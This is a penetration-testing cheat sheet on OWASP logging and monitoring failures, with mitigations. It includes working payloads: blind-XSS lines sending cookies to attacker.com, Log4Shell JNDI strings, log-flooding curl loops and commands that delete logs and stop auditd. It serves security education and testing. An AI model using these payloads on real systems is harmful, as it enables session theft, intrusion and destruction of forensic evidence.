---
title: Security Logging and Monitoring Failures
---

# Security Logging & Monitoring Failures

**(OWASP Top 10 A09:2021 — formerly Insufficient Logging & Monitoring)**

Logging and Monitoring Failures occur when applications fail to adequately record, retain, or alert on critical security events. It is a "silent" vulnerability — it doesn't enable direct exploitation but dramatically amplifies the impact of every other attack by allowing prolonged undetected access. Average breach dwell time without effective monitoring: **241 days** (IBM Cost of a Data Breach Report).

## Understanding the Basics

### The Visibility Gap

Failures typically occur in three stages:

1. **Generation Failure** — No log entry created for critical events (failed logins, privilege escalations, permission changes)
2. **Storage Failure** — Logs exist but stored locally on the compromised server, easily deleted or overwritten
3. **Monitoring Failure** — Logs generated and preserved but unmonitored — no SIEM rules, no alerting, no correlation

### Common Logging Antipatterns

- Logging sensitive data in plaintext — passwords, tokens, API keys, PII → creates new exposure
- Vague entries — generic `Error 500` with no user ID, IP, timestamp, or context
- Success-only logging — no records of failures, brute-force attempts, or authorization denials
- Decentralized logs — stored per server/container, preventing cross-system correlation
- No structured format — hinders automated parsing and SIEM ingestion

## Attack Surface & What Goes Undetected

- **Authentication endpoints** — Credential stuffing, brute force across many IPs with no alert
- **Authorization failures** — IDOR: user iterating thousands of unauthorized resource IDs silently
- **Injection attacks** — SQLi, XSS payloads hitting endpoints, triggering errors, generating no alert
- **Privilege escalation** — Regular user accessing admin endpoints with no anomaly detection
- **Uploaded files** — Malicious file uploads (webshells, malware) processed with no log entry
- **Commonly logged HTTP headers** — `User-Agent`, `Referer`, `X-Forwarded-For`, `Authorization`, `Content-Type`, `Origin` — often missing from logs, critical for correlation and forensics
- **Data access events** — PII/PHI records read or exported in bulk with no audit trail
- **API key usage** — Key generation, rotation, or high-volume API calls with no visibility

## Exploiting Logging Failures

### 1. CRLF Injection / Log Forging

Inject `\r\n` characters into user-controlled input to write fake log entries, framing other users or hiding malicious activity.

```
GET /search?q=normaluser%0d%0a[2024-01-01 12:00:00] INFO User admin logged in successfully HTTP/1.1
```

```
Injected log output:
[2024-01-01 11:59:59] INFO Search query: normaluser
[2024-01-01 12:00:00] INFO User admin logged in successfully   ← forged entry
```

Payloads:

```
%0d%0a          → CRLF
%0a             → LF only
\r\n            → raw CRLF (in JSON/XML body)
admin%0aINFO:+Login+successful
```

### 2. SIEM Blind XSS via Log Injection

If logs are rendered in a web-based SIEM or admin dashboard without sanitization, inject XSS payloads that fire when a security analyst views the log entry.

```
GET /login HTTP/1.1
User-Agent: <script src="https://attacker.com/blind.js"></script>
X-Forwarded-For: "><img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
```

```
# Payload in username field at login
username=admin<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
```

When a SOC analyst opens the log viewer → payload executes in their browser → session hijacked.

### 3. Log Flooding / Noise Injection

Overwhelm the logging system with high-volume junk events to exhaust storage, trigger log rotation (overwriting older entries), or bury real attack activity in noise.

```bash
# Flood login endpoint to exhaust log storage and bury real events
for i in $(seq 1 100000); do
  curl -s -o /dev/null -X POST https://target.com/login \
    -d "username=noise$i&password=junk"
done

# Flood with crafted entries to push real events out of retention window
while true; do
  curl -s "https://target.com/search?q=$(cat /dev/urandom | tr -dc 'a-z' | head -c 8)"
done
```

Effect: real attacker activity (e.g., actual credential stuffing hits) rotates out of logs before detection.

### 4. Insecure Log Storage / Log Exposure

Logs stored in web-accessible directories or with weak permissions can be directly read by attackers — leaking session tokens, internal IPs, stack traces, and credentials.

```bash
# Common exposed log paths to probe
/logs/app.log
/var/log/nginx/access.log
/storage/logs/laravel.log
/.git/logs/HEAD
/debug.log
/error.log
/api/logs
/admin/logs/view

# Directory brute force for log files
ffuf -u https://target.com/FUZZ -w log-paths.txt -mc 200
```

Exposed log contents to look for:

```
[ERROR] Login failed for user admin — password: hunter2   ← plaintext credential in log
[DEBUG] DB query: SELECT * FROM users WHERE id=1          ← internal query exposure
[INFO] Token issued: eyJhbGc...                           ← JWT leaked in log
```

### 5. Log Deletion / Tampering (Post-Compromise)

After gaining access, attackers clear or truncate logs to destroy forensic evidence.

```bash
# Clear system logs
rm -rf /var/log/*
truncate -s 0 /var/log/auth.log
echo "" > /var/log/apache2/access.log

# Selectively remove own IP from access logs
sed -i '/203.0.113.45/d' /var/log/nginx/access.log

# Disable logging service
service rsyslog stop
systemctl disable auditd
```

### 6. Log4Shell (Insecure Logger — CVE-2021-44228)

Malicious input passed to a vulnerable Log4j logger triggers JNDI lookup — leading to remote code execution. Any user-controlled string that reaches a `log.info()`, `log.error()` call is a potential vector.

```
# JNDI injection payload in any logged field
${jndi:ldap://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}   ← obfuscated bypass

# Common injection points (headers, parameters, body fields)
User-Agent: ${jndi:ldap://attacker.com/x}
X-Forwarded-For: ${jndi:ldap://attacker.com/x}
username=${jndi:ldap://attacker.com/x}
```

Test for blind execution (DNS callback):

```
${jndi:dns://your.burpcollaborator.net/test}
# DNS hit confirms vulnerable logger
```

### Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| Brute Force Detection | 20+ failed logins on one account | Alert triggered in SIEM / SOC dashboard |
| CRLF Injection | Inject `%0d%0a` in URL parameter | Forged log entry appears in log output |
| Blind XSS via Log | Inject `<script>` in `User-Agent` | Payload fires when analyst views log dashboard |
| Log Flooding | 100,000 junk requests in rapid succession | Real events pushed out of retention window |
| Exposed Log Path | Probe `/logs/app.log`, `/storage/logs/` | Log file directly accessible over HTTP |
| Log4Shell | `${jndi:ldap://attacker.com/x}` in `User-Agent` | DNS/LDAP callback confirms RCE vector |
| Sensitive Data in Logs | Perform login; inspect resulting log entry | No passwords, tokens, or PII visible |
| Log Deletion | Delete log file as low-privilege web user | Action denied; attempt itself logged |

## What Should Be Logged

| Event Category | Critical Data Points |
| --- | --- |
| **Authentication** | Success, failure (with reason), logout, MFA attempts, lockouts |
| **Access Control** | Authorization failures (`401`/`403`), role/permission changes |
| **Data Access** | PII/PHI records read, exported, or modified in bulk; who, when, from where |
| **Input Validation** | Malformed requests, injection payloads, anomalous sizes or encoding |
| **Critical Actions** | Password/email/MFA reset, API key generation/revocation, admin actions |
| **Error & Exceptions** | Unhandled exceptions, stack traces (sanitized), repeated error patterns |
| **File Operations** | File uploads (name, type, size, outcome), downloads of sensitive files |
| **System Events** | App startup/shutdown, config changes, backup/restore access |

Always include in every entry: `timestamp`, `user ID / session ID`, `source IP`, `endpoint / URL`, `HTTP method`, `HTTP status`, `request parameters (sanitized)`

## Detection Techniques (Offensive Perspective)

### Manual Detection: Confirming Logging Failures

**No 4xx/5xx Logged on Abuse**

```
Perform 50 rapid failed logins → check if any log entry exists
Send SQLi payload → check if error or input is recorded
If no entry → generation failure confirmed
```

**Plaintext Sensitive Data in Logs**

```bash
# Trigger a login, then read the log
curl -s -X POST https://target.com/login -d "username=test&password=mysecret"
curl -s https://target.com/logs/app.log | grep "mysecret"
# If found → credentials logged in plaintext
```

**CRLF Injection Confirmation**

```bash
curl -s "https://target.com/search?q=test%0d%0aFAKE+LOG+ENTRY"
# Check log output for injected line
curl -s https://target.com/logs/app.log | grep "FAKE LOG ENTRY"
```

**Log4Shell DNS Callback**

```bash
# Submit payload in User-Agent, check Burp Collaborator or interactsh for DNS hit
curl -s https://target.com/ \
  -H 'User-Agent: ${jndi:ldap://YOUR.interactsh.com/test}'
# DNS hit within seconds = vulnerable
```

### Automated Detection

```bash
# Probe common exposed log paths
wordlist=("app.log" "error.log" "debug.log" "laravel.log" "access.log" "system.log")
for path in "${wordlist[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://target.com/logs/$path)
  [[ "$code" == "200" ]] && echo "[EXPOSED] /logs/$path"
done
```

```bash
# Test CRLF in common parameters
for param in q search input username; do
  response=$(curl -s "https://target.com/page?$param=test%0d%0aINJECTED_LINE")
  echo "$response" | grep -q "INJECTED_LINE" && echo "[CRLF VULN] param: $param"
done
```

```bash
# Log4Shell mass header test via nuclei
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml
# Or manually across headers
for header in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version"; do
  curl -s https://target.com/ \
    -H "$header: \${jndi:ldap://YOUR.interactsh.com/$header}"
done
```

## Impact

- **Extended Dwell Time** — Attackers operate undetected for weeks or months; average 241 days without monitoring
- **Evidence Destruction** — Post-compromise log deletion eliminates forensic trail; incident response is blind
- **Log Forging** — CRLF injection plants false entries; framing legitimate users or hiding real attacker activity
- **SIEM / Analyst Compromise** — Blind XSS via injected log entries hijacks security team sessions
- **RCE via Insecure Logger** — Log4Shell and similar vulnerabilities turn the logging layer into an execution vector
- **Compliance Violations** — Insufficient audit trails breach GDPR, HIPAA, PCI-DSS, and SOC 2 requirements

## Tools

| Tool | Purpose |
| --- | --- |
| Burp Suite (Collaborator) | Blind XSS and Log4Shell DNS callback detection |
| interactsh | Out-of-band DNS/HTTP callback listener for blind injection confirmation |
| nuclei | Template-based scanning including Log4Shell and CRLF payloads |
| ffuf | Brute force exposed log file paths |
| ELK Stack / Splunk / Graylog | Centralized log aggregation and SIEM correlation (defensive) |

## Mitigation & Prevention

1. **Centralized Logging** — Forward all logs to a secure, append-only system (ELK, Splunk, Graylog, CloudWatch + SIEM); never store only on the application server
2. **Structured Logging** — Use JSON format for machine-readable, queryable, SIEM-ingestible entries
3. **Sanitize Log Inputs** — Strip or encode CRLF characters (`\r`, `\n`) from all user-controlled input before logging; never log raw request data
4. **Never Log Sensitive Data** — No credentials, tokens, full PII, or API keys in logs; mask/truncate where necessary
5. **Log Integrity & Retention** — Tamper-evident storage (WORM, digital signatures), enforced retention periods, restricted write access
6. **Alerting Rules** — Define thresholds: >5 `403` errors from one IP in 60s, >10 failed logins on one account, bulk data access = high-priority alert
7. **Patch Insecure Loggers** — Log4j → upgrade to 2.17.1+; sanitize JNDI lookups; apply `log4j2.formatMsgNoLookups=true` as interim control
8. **SIEM Integration** — Correlate application + infrastructure + network logs; alert on anomalies across sources, not just individual events

## Good To Read

### HackerOne Reports

- [HackerOne Internal Incident — How Logging Saved the Investigation (#1622449)](https://hackerone.com/reports/1622449)
- [Real-Time Error Logs Leaked Through Debug Information — Slack (#503283)](https://hackerone.com/reports/503283)
- [Account Takeover through SCIM Provisioning (#3178999)](https://hackerone.com/reports/3178999)

## References

- [OWASP Top 10:2021 — A09: Security Logging and Monitoring Failures](https://owasp.org/Top10/2021/A09_2021-Security_Logging_and_Monitoring_Failures)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [NIST SP 800-92: Guide to Computer Security Log Management](https://csrc.nist.gov/pubs/sp/800/92/final)
- [IBM Cost of a Data Breach Report](https://www.ibm.com/reports/data-breach)
- [PortSwigger: CRLF Injection](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning)
- [Log4Shell — CVE-2021-44228 (LunaSec)](https://www.lunasec.io/docs/blog/log4j-zero-day/)